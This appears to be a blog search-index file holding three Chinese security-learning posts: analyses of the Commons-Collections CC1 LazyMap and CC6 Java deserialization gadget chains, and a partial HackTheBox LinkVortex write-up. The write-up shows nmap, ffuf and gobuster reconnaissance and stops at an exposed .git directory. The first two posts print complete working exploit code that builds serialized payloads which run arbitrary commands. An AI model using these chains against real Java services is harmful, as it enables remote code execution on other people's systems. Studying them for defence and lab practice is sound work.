<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>CC1-LazyMap</title>
    <url>/2024/12/02/CC1-LazyMap/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在上文中提到了Commons-Collections的TransformMap 链，其实CC1是有两条链子的，今天来补充LazyMap链，这条链也是被称为正版链,因为 用的就是这条链</p>
<h1 id="正版CC1分析"><a href="#正版CC1分析" class="headerlink" title="正版CC1分析"></a>正版CC1分析</h1><h2 id="尾部exec的方法"><a href="#尾部exec的方法" class="headerlink" title="尾部exec的方法"></a>尾部exec的方法</h2><p>上一篇文章写的一样，还是在InvokeTransformer类里的</p>
<p><img src="/2024/12/02/CC1-LazyMap/image-20241202174712927.png" alt="image-20241202174712927"></p>
<p>通过反射构造任意类，具体不在赘述，右键-》查找用法</p>
<p><img src="/2024/12/02/CC1-LazyMap/image-20241202174814224.png" alt="image-20241202174814224"></p>
<p>可以看到LazyMap的get方法出现了transform，get方法的作用域为pubulic</p>
<h2 id="寻找链子"><a href="#寻找链子" class="headerlink" title="寻找链子"></a>寻找链子</h2><p>Ctrl+右键点击factory，跟过去看看这是什么东西，</p>
<p><img src="/2024/12/02/CC1-LazyMap/image-20241202175203296.png" alt="image-20241202175203296"></p>
<p>然后看到了decorate方法，这个方法，和上篇文章那个差不多，就是往里传一个Map，它返回一个LazyMap尝试用它弹个计算器</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">    <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">    HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    <span class="type">Map</span>  <span class="variable">decoratedMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, invokerTransformer); <span class="comment">// 生成恶意的map</span></span><br><span class="line">    <span class="comment">// 反射调用LazyMap的get方法</span></span><br><span class="line">    Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;</span><br><span class="line">    <span class="type">Method</span> <span class="variable">lazyMapGetMethod</span> <span class="operator">=</span> lazyMapClass.getMethod(<span class="string">&quot;get&quot;</span>, Object.class);</span><br><span class="line">    <span class="comment">// 开启反射权限</span></span><br><span class="line">    lazyMapGetMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    lazyMapGetMethod.invoke(decoratedMap,runtime);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2024/12/02/CC1-LazyMap/image-20241202180831543.png" alt="image-20241202180831543"></p>
<h3 id="寻找readObject"><a href="#寻找readObject" class="headerlink" title="寻找readObject"></a>寻找readObject</h3><p>说明这里是可行的，接下来我们去寻找入口类</p>
<p><img src="/2024/12/02/CC1-LazyMap/image-20241202182655300.png" alt="image-20241202182655300"></p>
<p>看了看哪些类调用LazyMap.get()，我也不知道4400多个调用大佬们是怎么找到的，反正就是跟到了<code>AnnotationInvocationHandler.invoke()</code> 方法中找到了有一个地方调用了 <code>get()</code> 方法，这个类我们在上一篇文章中也是有用到的，</p>
<p>位于sun.reflect.annotation.AnnotationInvocationHandler</p>
<p><img src="/2024/12/02/CC1-LazyMap/image-20241202183247095.png" alt="image-20241202183247095"></p>
<p>同时这个类里有readObject()方法，可以作为入口类，且memberValues参数是写在构造函数里的，是我们可以控制的，现在的问题就是要怎么触发invoke方法</p>
<h1 id="编写EXP"><a href="#编写EXP" class="headerlink" title="编写EXP"></a>编写EXP</h1><p>要触发invoke方法，就会想到用动态代理，一个类被动态代理了之后，想要通过代理调用这个类的方法，就一定会调用 <code>invoke()</code> 方法</p>
<p><img src="/2024/12/02/CC1-LazyMap/image-20241202184140707.png" alt="image-20241202184140707"></p>
<p>这里调了<code>entrySet()</code> 方法，也就是说，如果我们将 <code>memberValues</code> 的值改为代理对象，当调用代理对象的方法，那么就会跳到执行 <code>invoke()</code> 方法，最终完成整条链子的调用</p>
<p><img src="/2024/12/02/CC1-LazyMap/image-20241202190627284.png" alt="image-20241202190627284"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.study;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1Test</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">// 1. 创建Transformer数组</span></span><br><span class="line">    Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2、构造恶意map</span></span><br><span class="line">    HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    <span class="type">Map</span> <span class="variable">decorateMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);</span><br><span class="line"></span><br><span class="line">    <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">    <span class="type">Constructor</span> <span class="variable">declaredConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">    declaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> (InvocationHandler) declaredConstructor.newInstance(Override.class, decorateMap);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 代理对象</span></span><br><span class="line">    <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(declaredConstructor.getClass().getClassLoader(),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, invocationHandler);</span><br><span class="line">    invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Override.class, proxyMap);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 序列化</span></span><br><span class="line">    serialize(invocationHandler);</span><br><span class="line">    unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 序列化</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">    oos.writeObject(obj);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 反序列化</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">    <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">    <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">    <span class="keyword">return</span> obj;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>Java安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Commons-Collections-6</title>
    <url>/2024/12/02/Commons-Collections-6/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在前两篇的CC1的Tranformber和LazyMap链其实都存在着一个问题，就是前两个链都在jdk8u71后被修复了，那么有没有一条不受限制JDK版本的CC链呢？当然是有的Commons-Collections6就是<img src="/2024/12/02/Commons-Collections-6/image-20241202203740613.png" alt="image-20241202203740613"></p>
<p>这个链其实就是HashMap，也就是最开始的URLDNS链，CC6 链的前半条链与 CC1 Lazymap链子是一样的，也就是到 LazyMap 链</p>
<h1 id="CC6分析"><a href="#CC6分析" class="headerlink" title="CC6分析"></a>CC6分析</h1><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><h3 id="JDK版本"><a href="#JDK版本" class="headerlink" title="JDK版本"></a>JDK版本</h3><p>因为我本机有个新的jdk1.8.202,此链又是不限jdk版本的，遂就使用这个版本了</p>
<p><img src="/2024/12/02/Commons-Collections-6/image-20241202205803939.png" alt="image-20241202205803939"></p>
<h3 id="Maven导入"><a href="#Maven导入" class="headerlink" title="Maven导入"></a>Maven导入</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>





<h2 id="尾部exec方法"><a href="#尾部exec方法" class="headerlink" title="尾部exec方法"></a>尾部exec方法</h2><p>尾部和cc1其实一样，代码可以直接照搬过来</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1. 创建Transformer数组</span></span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">HashMap&lt;Object,Object&gt; lazyMap= <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br></pre></td></tr></table></figure>

<p>然后其实这个链就是TiedMapEntry里 <code>getValue()</code> 方法调用了 <code>LazyMap</code> 的 <code>get()</code> 方法</p>
<p><img src="/2024/12/02/Commons-Collections-6/image-20241202211502611.png" alt="image-20241202211502611"></p>
<p>看到这里就很简单了，我们用 <code>TiedMapEntry</code> 写一个 EXP，确保这条链子是能用的。</p>
<p><img src="/2024/12/02/Commons-Collections-6/image-20241202212517937.png" alt="image-20241202212517937"></p>
<p>成功弹出计算器~</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">    HashMap&lt;Object,Object&gt; hashMap= <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);</span><br><span class="line">    <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">    tiedMapEntry.getValue();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2024/12/02/Commons-Collections-6/image-20241202213149013.png" alt="image-20241202213149013"></p>
<p>但是这里有个问题，刚序列化就弹计算器了，原因和URLDNS链差不多</p>
<h2 id="解决刚序列化就弹计算器-反序列化不弹"><a href="#解决刚序列化就弹计算器-反序列化不弹" class="headerlink" title="解决刚序列化就弹计算器&amp;&amp;反序列化不弹"></a>解决刚序列化就弹计算器&amp;&amp;反序列化不弹</h2><p><img src="/2024/12/02/Commons-Collections-6/image-20241202213303648.png" alt="image-20241202213303648"></p>
<p>调用put方法时他这里也调用了hash，那么我们和URLDNS链那里一样的，用反射让它put的时候不要触发链。</p>
<h3 id="序列化就弹"><a href="#序列化就弹" class="headerlink" title="序列化就弹"></a>序列化就弹</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">HashMap&lt;Object,Object&gt; hashMap= <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(hashMap,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)); <span class="comment">//这里先放个没啥用的东西</span></span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">HashMap&lt;Object,Object&gt; map2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">map2.put(tiedMapEntry,<span class="string">&quot;test&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 反射</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> lazyMap.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">declaredField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">declaredField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">declaredField.set(lazyMap,chainedTransformer); <span class="comment">//这里在给它改回正确的</span></span><br><span class="line"></span><br><span class="line">serialize(map2);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2024/12/02/Commons-Collections-6/image-20241202214301715.png" alt="image-20241202214301715"></p>
<p>现在序列化的时候就不会触发链了，但是问题来了，我们反序列化时候也不会弹。。。这是为啥嘞？打个断点跟进去看。</p>
<p><img src="/2024/12/02/Commons-Collections-6/image-20241202215952637.png" alt="image-20241202215952637"></p>
<p>这里在put的时候会给lazymap添加一个key，那我们把它删掉就可以了</p>
<p><img src="/2024/12/02/Commons-Collections-6/image-20241202220140537.png" alt="image-20241202220140537"></p>
<p>这样就成功的弹出了计算器</p>
<h1 id="最终EXP"><a href="#最终EXP" class="headerlink" title="最终EXP"></a>最终EXP</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">    HashMap&lt;Object,Object&gt; hashMap= <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(hashMap,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)); <span class="comment">//这里先放个没啥用的东西</span></span><br><span class="line">    <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">    HashMap&lt;Object,Object&gt; map2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    map2.put(tiedMapEntry,<span class="string">&quot;test&quot;</span>);</span><br><span class="line"></span><br><span class="line">    lazyMap.remove(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">    <span class="comment">// 反射</span></span><br><span class="line">    <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> lazyMap.getClass();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">declaredField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">    declaredField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    declaredField.set(lazyMap,chainedTransformer); <span class="comment">//这里在给它改回正确的</span></span><br><span class="line"></span><br><span class="line">    serialize(map2);</span><br><span class="line">    unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p><img src="/2024/12/02/Commons-Collections-6/CC.png" alt="CC"></p>
<p>入门后越来越简单咯！</p>
]]></content>
      <tags>
        <tag>Java安全</tag>
      </tags>
  </entry>
  <entry>
    <title>[HTB]LinkVortex WriteUp</title>
    <url>/2024/12/14/HTB-LinkVortex-WriteUp/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>今天来玩一下靶机，记录一下</p>
<p>靶机地址：<a class="link" href="https://app.hackthebox.com/machines/LinkVortex">https://app.hackthebox.com/machines/LinkVortex<i class="fas fa-external-link-alt"></i></a></p>
<h1 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h1><p><img src="/2024/12/14/HTB-LinkVortex-WriteUp/image-20241214162327733.png" alt="image-20241214162327733"></p>
<p>开局给了一个IP地址</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">└─$ <span class="built_in">sudo</span> nmap 10.10.11.47 --min-rate 10000 -sS -sV -O -p- </span><br></pre></td></tr></table></figure>

<h2 id="扫描"><a href="#扫描" class="headerlink" title="扫描"></a>扫描</h2><p>使用Nmap用半开放式扫描进行端口探测，并探测系统版本</p>
<p><img src="/2024/12/14/HTB-LinkVortex-WriteUp/image-20241214163807087.png" alt="image-20241214163807087"></p>
<p>最终得到了以上结果，可以见到开放了80和22端口，说明是有http服务存在的，尝试直接访问网站，这边直接跳转到了一个网址<a class="link" href="http://linkvortex.htb/%EF%BC%8C%E4%BD%86%E6%98%AF%E6%89%93%E4%B8%8D%E5%BC%80%EF%BC%8C%E5%B0%9D%E8%AF%95%E6%8A%8Aip%E5%9C%B0%E5%9D%80%E5%8A%A0%E5%85%A5%E5%88%B0hosts%E9%87%8C%E9%9D%A2">http://linkvortex.htb/，但是打不开，尝试把ip地址加入到hosts里面<i class="fas fa-external-link-alt"></i></a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/hosts</span><br></pre></td></tr></table></figure>

<p><img src="/2024/12/14/HTB-LinkVortex-WriteUp/image-20241214164108104.png" alt="image-20241214164108104"></p>
<h2 id="子域名爆破"><a href="#子域名爆破" class="headerlink" title="子域名爆破"></a>子域名爆破</h2><p>现在在进行访问就是正确的内容了，大概翻看了一下，没有得到什么有价值的信息</p>
<p><img src="/2024/12/14/HTB-LinkVortex-WriteUp/image-20241214164133079.png" alt="image-20241214164133079"></p>
<p>根据网页最右下角的版权信息（Powered by Ghost）可以知道这用了一个叫做Ghost的CMS搭建，既然他给了域名那肯定不是白给的，尝试对子域名进行爆破</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿redpomelo)-[~]                            │</span><br><span class="line">└─$ ffuf -c -u http://linkvortex.htb/ -H &quot;HOST:FUZZ.│</span><br><span class="line">linkvortex.htb&quot; -w ~/tools/Subdomain_List/subdomains│</span><br><span class="line">.txt -fc 301 </span><br></pre></td></tr></table></figure>

<p>成功找到了子域名.dev，同时附上我所使用的子域名字典：<a class="link" href="https://github.com/DictionaryHouse/Subdomain_List">点击访问<i class="fas fa-external-link-alt"></i></a></p>
<p><img src="/2024/12/14/HTB-LinkVortex-WriteUp/image-20241214165205463.png" alt="image-20241214165205463"></p>
<h2 id="目录爆破"><a href="#目录爆破" class="headerlink" title="目录爆破"></a>目录爆破</h2><p>找到子域的同时，修改hosts文件把找到的子域丢进去，然后对子域名进行一波目录爆破看看能不能找到什么有价值的信息</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿redpomelo)-[~]</span><br><span class="line">└─$ sudo gobuster dir -u http://dev.linkvortex.htb/ -w ~/tools/scan-dictmaster/dir.txt </span><br></pre></td></tr></table></figure>

<p><img src="/2024/12/14/HTB-LinkVortex-WriteUp/image-20241214165725552.png" alt="image-20241214165725552"></p>
<p>找到两个，这个git文件就很有意思</p>
<p><img src="/2024/12/14/HTB-LinkVortex-WriteUp/image-20241214170120939.png" alt="image-20241214170120939"></p>
